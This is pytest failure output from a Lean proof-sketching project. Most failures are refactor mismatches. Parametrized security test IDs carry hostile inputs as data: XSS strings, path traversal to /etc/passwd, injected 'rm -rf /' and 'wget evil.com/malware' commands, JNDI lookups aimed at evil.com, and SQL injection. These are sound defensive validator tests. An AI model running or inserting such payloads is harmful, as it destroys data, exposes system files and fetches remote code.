FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[<script>alert('xss')</script>-&lt;script&gt;alert('xss')&lt;/script&gt;] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[javascript:alert('xss')-javascript:alert('xss')] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[<img src=x onerror=alert('xss')>-&lt;img src=x onerror=alert('xss')&gt;] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[&lt;script&gt;alert('xss')&lt;/script&gt;-&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[../../../etc/passwd-../../../etc/passwd] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[..\\..\\..\\windows\\system32-..\\..\\..\\windows\\system32] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[/etc/passwd-/etc/passwd] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean; rm -rf /-file.lean; rm -rf /] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean && cat /etc/passwd-file.lean && cat /etc/passwd] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean || wget evil.com/malware-file.lean || wget evil.com/malware] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[`rm -rf /`-`rm -rf /`] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[$(rm -rf /)-$(rm -rf /)] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[${jndi:ldap://evil.com/a}-${jndi:ldap://evil.com/a}] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[${jndi:rmi://evil.com/a}-${jndi:rmi://evil.com/a}] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.txt\x00.exe-file.txt.exe] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file.lean\x00../../../etc/passwd-file.lean../../../etc/passwd] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file\u200b.lean-file\u200b.lean] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[file\u2028.lean-file\u2028.lean] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[theorem test : True := trivial-theorem test : True := trivial] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[valid_theorem_name-valid_theorem_name] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[-] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[../../../etc/passwd-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[..\\..\\..\\windows\\system32-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[/etc/passwd-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean/../../../etc/passwd-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean; rm -rf /-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean && cat /etc/passwd-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean || wget evil.com-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean | grep secret-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean `rm -rf /`-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean $(rm -rf /)-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean {rm -rf /}-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.lean-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[subdir/file.lean-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[deep/nested/file.lean-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file-with-dash.lean-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file_with_underscore.lean-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[file.with.dots.lean-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_file_path_validation[-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[valid_theorem-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[theorem_with_numbers123-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[theorem.with.dots-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[_leading_underscore-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[CamelCase-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[simple-True] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[123invalid-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid-dash-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid space-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid@symbol-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid/slash-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid\\backslash-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[.invalid-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid.-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[invalid..double-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[../../etc/passwd-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[$(rm -rf /)-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[`rm -rf /`-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation['; DROP TABLE theorems; ---False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_theorem_name_validation[<script>alert('xss')</script>-False] - AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_lean_code_sanitization - AttributeError: type object 'InputValidator' has no attribute 'sanitize_lean_code'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_filename_sanitization - AttributeError: type object 'ProofSketcherConfig' has no attribute 'sanitize_filename'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://api.anthropic.com/v1/messages-False-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com-False-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://subdomain.example.com-False-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[wss://websocket.example.com-False-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://example.com-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[ftp://example.com-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[file:///etc/passwd-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[javascript:alert('xss')-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[data:text/html,<script>alert('xss')</script>-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://localhost:8000-True-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://127.0.0.1:8000-True-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://localhost-True-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[http://localhost:8000-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com/../admin-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com/normal/path-False-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[not-a-url-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[://invalid-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[//example.com-False-False] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestURLValidation::test_url_validation[https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-False-True] - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/security/test_input_validation.py::TestSecureConfiguration::test_api_key_validation - AttributeError: type object 'ProofSketcherConfig' has no attribute 'get_api_key'
FAILED tests/security/test_input_validation.py::TestSecureConfiguration::test_session_id_generation - AttributeError: type object 'ProofSketcherConfig' has no attribute 'generate_session_id'
FAILED tests/security/test_input_validation.py::TestSecureConfiguration::test_nonce_generation - AttributeError: type object 'ProofSketcherConfig' has no attribute 'generate_nonce'
FAILED tests/security/test_input_validation.py::TestSecureConfiguration::test_security_headers - AttributeError: type object 'ProofSketcherConfig' has no attribute 'get_secure_headers'
FAILED tests/security/test_input_validation.py::TestSecureConfiguration::test_environment_validation - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_environment'
FAILED tests/security/test_input_validation.py::TestSecurityBypass::test_no_eval_execution - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestSecurityBypass::test_no_file_system_access - AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
FAILED tests/security/test_input_validation.py::TestSecurityBypass::test_no_network_access_bypass - AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
FAILED tests/test_cli.py::TestCLI::test_cli_debug_mode - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'setup_logging'
FAILED tests/test_cli.py::TestProveCommand::test_prove_basic - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestProveCommand::test_prove_with_options - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestProveCommand::test_prove_specific_theorem - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestProveCommand::test_prove_error_handling - assert "Invalid file extension '.txt'" in 'Invalid file path: Path escapes current working directory\n'
 +  where 'Invalid file path: Path escapes current working directory\n' = <Result SystemExit(1)>.output
FAILED tests/test_cli.py::TestConfigCommand::test_config_show - ModuleNotFoundError: No module named 'proof_sketcher.animator'
FAILED tests/test_cli.py::TestConfigCommand::test_config_save - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/test_cli.py::TestCacheCommand::test_cache_status - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'CacheManager'
FAILED tests/test_cli.py::TestCacheCommand::test_cache_clear - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'CacheManager'
FAILED tests/test_cli.py::TestCacheCommand::test_cache_clear_specific_type - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'CacheManager'
FAILED tests/test_cli.py::TestListCommand::test_list_theorems - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestBatchProcessing::test_process_directory - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestBatchProcessing::test_progress_bar - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestCLIIntegration::test_full_pipeline_cli - AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
FAILED tests/test_cli.py::TestCLIIntegration::test_config_persistence - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_generate_content_from_docgen - pydantic_core._pydantic_core.ValidationError: 4 validation errors for ProofStep
intuitive_explanation
  Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_explanation
  Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_explanation
  Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_explanation
  Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
FAILED tests/unit/test_docgen_plugin.py::TestEducationalContentGenerator::test_estimate_difficulty - AssertionError: assert 'intermediate' == 'advanced'

  - advanced
  + intermediate
FAILED tests/unit/test_docgen_plugin.py::TestLakeFacet::test_generate_educational_assets - AssertionError: assert False
 +  where False = exists()
 +    where exists = PosixPath('/var/folders/kb/h2jmx6m91qld2ldqbdprhbhr0000gn/T/tmpilzv4f4y/output/assets/educational.css').exists
FAILED tests/unit/test_exporters.py::TestHTMLExporter::test_html_export_single - TypeError: ExportResult.__init__() got an unexpected keyword argument 'output_files'
FAILED tests/unit/test_exporters.py::TestHTMLExporter::test_html_export_with_animations - TypeError: ExportResult.__init__() got an unexpected keyword argument 'output_files'
FAILED tests/unit/test_exporters.py::TestHTMLExporter::test_html_export_batch - pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
difficulty_level
  Value error, Difficulty must be one of ['beginner', 'intermediate', 'advanced'] [type=value_error, input_value='easy', input_type=str]
    For further information visit https://errors.pydantic.dev/2.11/v/value_error
FAILED tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_exporter_initialization - AttributeError: 'MarkdownExporter' object has no attribute 'notation_handler'
FAILED tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_notation_enhancement - AttributeError: 'MarkdownExporter' object has no attribute 'notation_handler'
FAILED tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_complexity_assessment - AttributeError: 'MarkdownExporter' object has no attribute '_assess_complexity'
FAILED tests/unit/test_exporters.py::TestMarkdownExporter::test_mathlib_export_single - AttributeError: <proof_sketcher.exporter.markdown.MarkdownExporter object at 0x1046741d0> does not have the attribute '_enhance_with_mathlib_notation'
FAILED tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_exporter_initialization - TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
FAILED tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_export_single - TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
FAILED tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_notebook_structure - TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
FAILED tests/unit/test_exporters.py::TestBaseExporter::test_jupyter_with_code_cells - TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_template_manager_initialization - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_render_html_template - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_render_markdown_template - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_template_context_helpers - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_custom_template_filters - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_template_not_found_handling - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_exporters.py::TestTemplateManager::test_template_inheritance - NameError: name 'TemplateContext' is not defined
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_parse_simple_file - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_parse_file_with_errors - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_parse_directory - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_dependency_extraction - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_tactic_extraction - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_namespace_handling - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestSimpleLeanParser::test_error_recovery - TypeError: SimpleLeanParser() takes no arguments
FAILED tests/unit/test_parsers.py::TestLeanExtractor::test_extractor_initialization - AttributeError: 'SimpleLeanParser' object has no attribute 'lean_executable'
FAILED tests/unit/test_parsers.py::TestLeanExtractor::test_extract_file_basic - AttributeError: <proof_sketcher.parser.simple_parser.SimpleLeanParser object at 0x104767680> does not have the attribute '_run_lean_command'
FAILED tests/unit/test_parsers.py::TestLeanExtractor::test_lean_command_execution - AttributeError: 'SimpleLeanParser' object has no attribute '_run_lean_command'
FAILED tests/unit/test_parsers.py::TestLeanExtractor::test_theorem_validation - AttributeError: 'SimpleLeanParser' object has no attribute '_validate_theorem'
FAILED tests/unit/test_parsers.py::TestLeanExtractor::test_error_handling - AttributeError: 'SimpleLeanParser' object has no attribute 'extract_file'
FAILED tests/unit/test_parsers.py::TestParserConfig::test_config_creation - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'timeout_seconds'
FAILED tests/unit/test_parsers.py::TestParserConfig::test_config_validation - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'timeout_seconds'
FAILED tests/unit/test_parsers.py::TestParserConfig::test_config_serialization - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'timeout_seconds'
FAILED tests/unit/test_parsers.py::TestParserConfig::test_config_loading - AttributeError: type object 'ParserConfig' has no attribute 'from_file'
ERROR tests/integration/test_full_pipeline.py::TestFullPipeline::test_parse_generate_export_pipeline - pydantic_core._pydantic_core.ValidationError: 9 validation errors for ProofSketch
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
